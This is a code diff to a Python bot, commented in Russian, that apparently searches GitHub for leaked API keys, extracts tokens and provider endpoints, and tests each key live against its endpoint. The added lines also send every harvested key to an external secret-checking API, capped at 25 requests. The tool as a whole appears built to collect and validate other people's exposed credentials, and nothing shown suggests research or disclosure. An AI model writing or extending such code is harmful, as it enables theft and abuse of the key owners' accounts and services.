@@ -150,6 +150,34 @@ def extract_keys_from_text(text):
                     if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
     return targets
 
+# ─── ПРОВЕРКА ЧЕРЕЗ CONTRASTAPI (С ЛИМИТОМ) ────────────────────────────────
+contrast_requests_made = 0
+MAX_CONTRAST_REQUESTS = 25  # Оставляем 5 запросов в запасе
+
+def check_with_contrast(text):
+    global contrast_requests_made
+    
+    if contrast_requests_made >= MAX_CONTRAST_REQUESTS:
+        return False  # Молча пропускаем, лимит исчерпан
+        
+    try:
+        url = "https://api.contrastcyber.com/v1/check/secrets"
+        payload = {"code": text, "language": "generic"}
+        resp = requests.post(url, json=payload, timeout=10)
+        
+        if resp.status_code == 200:
+            contrast_requests_made += 1
+            data = resp.json()
+            if data.get("total", 0) > 0:
+                logger.info(f"   └ ContrastAPI: найдено {data['total']} секретов.")
+                return True
+        elif resp.status_code == 429:
+            logger.warning("⚠️ ContrastAPI: Лимит исчерпан. Отключаю до конца сессии.")
+            contrast_requests_made = MAX_CONTRAST_REQUESTS
+    except Exception as e:
+        logger.error(f"❌ Ошибка ContrastAPI: {e}")
+    return False
+
 def fetch_github_targets():
     logger.info("🐙 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
@@ -373,6 +401,13 @@ async def long_scan_loop():
         for t in targets:
             key, endpoint = t["key"], t["endpoint"]
             if is_dead(key): continue
+            
+            # ─── ПРОВЕРКА CONTRASTAPI (если есть лимит) ───
+            if contrast_requests_made < MAX_CONTRAST_REQUESTS:
+                snippet = f'API_KEY = "{key}"'
+                # Выполняем запрос в отдельном потоке, чтобы не блокировать бота
+                await asyncio.to_thread(check_with_contrast, snippet)
+            # ─────────────────────────────────────────────
                 
             logger.info(f"Проверяю {key[:10]}... на {endpoint}")
             chk = await asyncio.to_thread(check_endpoint, key, endpoint)
